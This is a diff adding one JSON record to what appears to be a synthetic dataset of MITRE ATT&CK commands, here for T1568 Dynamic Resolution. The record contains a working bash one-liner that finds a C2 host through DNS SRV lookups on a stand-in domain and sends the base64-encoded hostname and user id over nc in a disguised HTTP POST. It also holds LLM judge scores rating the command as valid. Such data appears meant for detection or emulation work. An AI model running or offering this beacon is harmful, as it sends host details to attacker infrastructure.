@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"domain=cdn-service.example.com; srv=$(dig +short _sync._tcp.\\\"$domain\\\" SRV | sort -n | head -n1); target=$(printf '%s' \\\"$srv\\\" | awk '{print $4}' | sed 's/\\.$//'); port=$(printf '%s' \\\"$srv\\\" | awk '{print $3}'); ip=$(dig +short \\\"$target\\\" | shuf -n1); ua=\\\"Mozilla/5.0\\\"; data=$(printf 'h=%s&u=%s' \\\"$(hostname -s)\\\" \\\"$(id -u)\\\" | base64 -w0); body=\\\"$data\\\"; printf 'POST /sync HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$domain\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" \\\"$port\\\"\"",
+  "explanation": "Discovers service endpoints dynamically via DNS SRV records and resolves the SRV target to an IP, then posts base64 data to a generic sync path to blend in.",
+  "rationale_steps": [
+    "Query SRV to dynamically locate C2 service host and port.",
+    "Resolve SRV target's A record at runtime and randomize IP.",
+    "Mimic a sync API over HTTP with common headers.",
+    "Transmit via nc over the SRV-specified TCP port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-76243d9a",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid flag formats, correct command separators, and appropriate escape sequences throughout the complex bash command chain.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using DNS SRV records to discover endpoints, selecting random IPs from DNS responses, and establishing command and control through a disguised HTTP POST that transmits host and user information.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:13:35.954370Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitutions, and proper sequencing of operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1568 by dynamically resolving network endpoints (host and port) at runtime via DNS SRV and A records, then using them for data exfiltration typical of C2 beaconing.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:13:46.902519Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting (properly escaped for bash -c), valid substitutions, and correct flags for dig, sort, head, awk, sed, shuf, base64, printf, and nc.",
+        "semantic_score": 5,
+        "semantic_justification": "It dynamically discovers service endpoints via DNS SRV, resolves the target to an IP, selects one, and performs an HTTP POST to that endpoint, aligning well with T1568 Dynamic Resolution behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:14:34.301331Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
